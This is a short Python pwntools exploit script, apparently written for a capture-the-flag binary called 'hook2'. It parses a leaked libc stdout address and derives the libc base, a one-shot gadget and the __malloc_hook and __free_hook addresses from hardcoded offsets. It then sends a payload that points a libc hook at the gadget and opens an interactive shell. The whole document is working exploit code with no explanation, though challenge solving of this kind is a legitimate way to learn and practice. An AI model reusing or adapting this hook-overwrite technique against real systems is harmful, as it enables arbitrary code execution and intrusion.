from pwn import *

HOST = "./hook2"
e=ELF(HOST)
p=process(HOST)

p.recvuntil("stdout@LIBC addr: ")
stdout = int(p.recvline().strip("\n"), 16)
log.info("stdout@LIBC : "+hex(stdout))

# libc
libc_base = stdout-0x3c5620
log.info("LIBC : "+hex(libc_base))

# one_shot_godate
one_shot_gadget = libc_base+0xf1147
log.info("one_shot_gadget : "+hex(one_shot_gadget))

# __malloc_hook
__malloc_hook = libc_base+0x3c4b10
log.info("__malloc_hook : "+hex(__malloc_hook))

# __free_hook
__free_hook = libc_base+0x3c67a8
log.info("__free_hook : "+hex(__free_hook))

payload = p64(__malloc_hook)
payload += p64(one_shot_gadget)

p.sendline(payload)
p.interactive()



